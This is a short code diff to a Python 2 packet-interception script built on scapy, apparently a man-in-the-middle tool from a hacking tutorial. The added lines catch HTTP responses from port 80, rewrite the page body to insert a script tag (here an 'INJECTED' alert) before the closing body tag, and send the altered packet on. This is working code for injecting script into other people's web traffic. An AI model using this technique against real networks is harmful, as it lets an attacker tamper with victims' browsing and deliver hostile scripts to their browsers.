@@ -22,7 +22,9 @@ def process_packet(packet):
             packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print "[+] Response"
-            print scapy_packet.show()
+            modify_load = scapy_packet[scapy.Raw].load.replace("</body>","<script>alert('INJECTED')</script></body>")    
+            new_packet = set_load(scapy_packet,modify_load)
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
